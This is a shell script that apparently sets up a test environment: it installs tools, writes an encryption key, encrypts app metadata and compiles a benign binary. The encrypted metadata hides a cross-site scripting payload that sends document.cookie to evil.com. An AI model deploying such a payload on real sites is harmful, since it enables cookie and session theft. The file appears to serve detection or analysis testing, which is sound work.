#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip gcc binutils
    pip3 install pytest cryptography

    useradd -m -s /bin/bash user || true

    # Create the key
    echo "vQ1GzV0c3Vq9R_h-KzEw7_tT7X4xJ_O_G-L7Q5mR8D8=" > /home/user/key.txt

    # Create the encrypted metadata
    python3 -c "
from cryptography.fernet import Fernet
import json
key = b'vQ1GzV0c3Vq9R_h-KzEw7_tT7X4xJ_O_G-L7Q5mR8D8='
f = Fernet(key)
data = json.dumps({
    'app_name': 'SuperApp',
    'version': '1.0.4',
    'description': 'This is a great app! <script>fetch(\"http://evil.com/\"+document.cookie)</script>'
}).encode('utf-8')
enc = f.encrypt(data)
with open('/home/user/metadata.enc', 'wb') as out:
    out.write(enc)
"

    # Create the ELF binary
    cat << 'EOF' > /tmp/artifact.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("Running application setup...\n");
    system("echo 'Checking updates...'");
    return 0;
}
EOF
    gcc /tmp/artifact.c -o /home/user/artifact.bin
    rm /tmp/artifact.c

    chmod -R 777 /home/user
